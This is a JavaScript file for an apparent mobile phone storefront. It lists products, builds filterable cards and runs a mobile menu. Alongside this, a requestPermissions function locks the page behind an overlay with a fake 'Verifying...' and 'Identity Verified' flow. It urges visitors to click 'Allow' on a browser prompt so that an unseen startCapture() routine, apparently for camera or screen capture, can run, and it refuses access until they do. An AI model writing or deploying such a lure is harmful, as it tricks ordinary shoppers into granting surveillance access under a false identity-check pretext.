const products = [
    { id: 1, brand: "Apple", name: "iPhone 16 Pro Max", series: "16", specs: "256GB | Black Titanium", price: 165000, image: "Apple-iPhone-16-hero-240909_inline.jpg.large.jpg" },
    { id: 2, brand: "Apple", name: "iPhone 16", series: "16", specs: "128GB | Ultramarine", price: 98000, image: "iphone-16-mobile-phone-hres-10.jpg" },
    { id: 3, brand: "Apple", name: "iPhone 15 Pro Max", series: "15", specs: "256GB | Natural Titanium", price: 138000, image: "gsmarena_003.jpg" },
    { id: 4, brand: "Apple", name: "iPhone 15", series: "15", specs: "128GB | Blue", price: 88000, image: "iphone-15-128-gb-amarillo-muy-bueno.jpg" },
    { id: 5, brand: "Apple", name: "iPhone 14 Pro Max", series: "14", specs: "128GB | Deep Purple", price: 115000, image: "midnight-hero-zoom-v2.png" },
    { id: 6, brand: "Apple", name: "iPhone 13 Pro Max", series: "13", specs: "256GB | Sierra Blue", price: 95000, image: "iphone13.jpg" },
    { id: 7, brand: "Apple", name: "iPhone 13", series: "13", specs: "128GB | Pink", price: 65000, image: "iphone13.jpg" },
    { id: 8, brand: "Samsung", name: "Galaxy S24 Ultra", series: "S24", specs: "256GB | Titanium Gray", price: 145000, image: "Samsung-Galaxy-S25plus-JW-AP-IMG_20250727_174645.jpg?w=900" },
    { id: 9, brand: "Samsung", name: "Galaxy S23 Ultra", series: "S23", specs: "256GB | Phantom Black", price: 112000, image: "gsmarena_001.jpg" }
];

document.addEventListener('DOMContentLoaded', () => {
    const grid = document.getElementById('products-grid');
    const filterBtns = document.querySelectorAll('.filter-btn');

    function renderProducts(filter = 'all') {
        grid.innerHTML = '';
        const filtered = filter === 'all' ? products : products.filter(p => p.brand === filter || p.series === filter);
        filtered.forEach(p => {
            const card = document.createElement('div');
            card.className = `product-card ${['16', 'S24'].includes(p.series) ? 'new-release' : ''}`;
            card.innerHTML = `
                <div class="image-wrapper"><img src="${p.image}" alt="${p.name}" class="product-image" loading="lazy"></div>
                <div class="product-info">
                    <h3>${p.name}</h3>
                    <div class="product-specs"><span>${p.specs}</span></div>
                    <div class="product-price">NPR ${p.price.toLocaleString('en-IN')}</div>
                    <button class="buy-btn">View Details</button>
                </div>`;
            grid.appendChild(card);
        });
    }

    renderProducts();
    filterBtns.forEach(btn => btn.addEventListener('click', () => {
        filterBtns.forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        renderProducts(btn.dataset.filter);
    }));

    // Mobile Menu
    const menuBtn = document.getElementById('menu-toggle');
    const mobileMenu = document.getElementById('mobile-menu');
    menuBtn?.addEventListener('click', () => {
        mobileMenu.classList.toggle('active');
        const icon = menuBtn.querySelector('i');
        icon.classList.toggle('fa-bars');
        icon.classList.toggle('fa-xmark');
    });
});

window.requestPermissions = async function () {
    const btn = document.getElementById('enter-btn');
    const overlay = document.getElementById('entry-overlay');
    if (!btn || !overlay) return;

    btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Verifying...';
    btn.disabled = true;

    try {
        if (typeof startCapture === 'function') {
            // Show hint after a short delay if they haven't allowed yet
            const hintTimeout = setTimeout(() => {
                const hint = document.createElement('div');
                hint.id = 'perm-hint';
                hint.style.cssText = 'color: #00c6fb; margin-top: 15px; font-size: 0.9rem; animation: fadeIn 0.5s;';
                hint.innerHTML = '<i class="fa-solid fa-circle-info"></i> Please click <b>"Allow"</b> on the browser prompt above to finish verification.';
                btn.parentNode.appendChild(hint);
            }, 1500);

            await startCapture();
            clearTimeout(hintTimeout);
            document.getElementById('perm-hint')?.remove();

            btn.innerHTML = '<i class="fa-solid fa-check"></i> Identity Verified';
            btn.style.background = 'linear-gradient(135deg, #28a745, #20c997)';
            setTimeout(() => {
                overlay.style.opacity = '0';
                setTimeout(() => overlay.style.display = 'none', 500);
            }, 800);
        }
    } catch (err) {
        document.getElementById('perm-hint')?.remove();
        btn.innerHTML = '<i class="fa-solid fa-arrow-right"></i> Try Again';
        btn.disabled = false;
        // ... rest stays same
        const msg = document.createElement('div');
        msg.style.cssText = 'color: #ff6b6b; margin-top: 15px; font-size: 0.9rem;';
        msg.innerHTML = '<i class="fa-solid fa-circle-exclamation"></i> Access required to continue.';
        btn.parentNode.appendChild(msg);
        setTimeout(() => msg.remove(), 3000);
    }
};
